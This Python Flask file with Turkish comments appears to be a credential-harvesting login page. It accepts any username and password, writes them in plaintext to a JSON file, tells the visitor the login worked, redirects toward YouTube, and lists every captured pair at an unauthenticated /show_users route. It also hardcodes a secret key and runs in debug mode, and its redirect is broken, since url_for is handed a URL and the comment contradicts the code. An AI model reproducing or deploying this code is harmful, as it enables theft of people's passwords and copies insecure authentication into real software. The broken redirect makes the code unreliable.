from flask import Flask, render_template, request, redirect, flash, url_for
import json
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# JSON dosyasının yolu
JSON_FILE = 'users_data.json'

# JSON dosyasını okuma fonksiyonu
def load_users():
    if os.path.exists(JSON_FILE):
        with open(JSON_FILE, 'r') as file:
            return json.load(file)
    return []

# JSON dosyasına yazma fonksiyonu
def save_user_data(users):
    with open(JSON_FILE, 'w') as file:
        json.dump(users, file, indent=4)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login_post():
    username = request.form['username']
    password = request.form['password']

    # Kullanıcı adı ve şifre kontrolü
    if username and password:  # Burada daha güvenli bir doğrulama yapılabilir
        # Kullanıcıyı JSON dosyasına kaydet
        users_data = load_users()  # mevcut kullanıcıları yükle
        users_data.append({'username': username, 'password': password})  # yeni kullanıcıyı ekle
        save_user_data(users_data)  # dosyaya kaydet

        flash('Login successful!', 'success')
        return redirect(url_for('https://www.youtube.com'))  # /show_users sayfasına yönlendir
    else:
        flash('Invalid credentials, please try again.', 'danger')
        return redirect(url_for('login'))

@app.route('/show_users')
def show_users():
    # JSON dosyasından kullanıcıları alıyoruz
    users_data = load_users()

    # Kullanıcıları JSON formatında döndürüyoruz
    return render_template('show_users.html', users=users_data)

if __name__ == "__main__":
    app.run(debug=True)


